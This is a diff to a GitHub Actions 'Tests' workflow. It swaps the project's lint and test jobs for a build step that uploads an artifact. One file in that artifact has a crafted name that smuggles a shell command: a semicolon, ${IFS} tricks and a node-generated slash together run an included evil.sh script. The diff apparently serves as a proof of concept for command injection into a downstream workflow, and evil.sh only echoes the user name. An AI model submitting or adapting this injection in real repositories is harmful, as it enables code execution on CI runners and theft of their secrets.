@@ -2,15 +2,24 @@ name: Tests
 
 on:
   pull_request:
-  push:
-    branches:
-      - main
-      - feat/*
   workflow_dispatch:
 
 jobs:
-  lint:
-    uses: bgd-labs/github-workflows/.github/workflows/foundry-lint-prettier.yml@main
   test:
-    uses: bgd-labs/github-workflows/.github/workflows/foundry-test.yml@main
-    secrets: inherit
+    runs-on: ubuntu-latest
+    steps:
+      - name: build
+        run: |
+          mkdir -p out
+          printf '%s' "${{ github.event.number }}" > out/pr_number.txt
+          printf 'benign\n' > out/readme.txt
+          cat > out/evil.sh <<'SH'
+          #!/bin/bash
+          echo "PREPARE_RAN_AS $(id -un)"
+          echo "INJECTED_OK"
+          SH
+          printf 'x' > "out/readme.txt;P=\$(node\${IFS}-e\${IFS}'process.stdout.write(String.fromCharCode(47))');bash\${IFS}\${P}tmp\${P}content\${P}content\${P}evil.sh;#.txt"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: out/
